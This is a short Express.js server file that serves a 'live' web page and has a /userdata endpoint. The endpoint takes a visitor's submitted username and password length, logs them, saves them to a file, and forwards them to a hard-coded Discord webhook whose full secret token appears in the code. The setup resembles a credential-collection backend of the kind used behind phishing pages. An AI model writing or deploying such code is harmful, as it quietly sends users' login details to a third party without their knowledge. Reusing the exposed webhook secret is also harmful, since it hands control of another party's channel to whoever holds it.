import express from "express";
import fs from "fs";
import cors from 'cors';

const app = express();
app.use(cors({ origin: '*'}));

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

app.use(express.static(__dirname + "/public/live"));

app.get("/live", (req, res, next) => {
    res.sendFile(__dirname + "/public/live/index.html");
});

app.post("/userdata", (req, res, next) => {
    try {
        var data = `user: ${req.body.userName} passwordLength: ${req.body.passwordLength}`
        console.log(data);

        // send webhook to discord
        const axios = require('axios');

        axios.post('https://discord.com/api/webhooks/1305606177777778788/InbjBbuYwVV6R5DvN3Bne305sSGI8CTmMBKaolmi9VITc9hLai3dbnPgBkFZ22JjchDo', {
            content: data
        })

        fs.writeFile("result.txt", data, (err) => {
            if (err) console.log(err);
            console.log("Successfully Written to File.");
          });
        res.sendStatus(200);
        return;
    } catch(err) {
        console.log(err);
        res.sendStatus(404);
        return;
    }
});

const port = process.env.PORT || 5000;
app.listen(port, () => console.log(`Server running on port ${port}`));
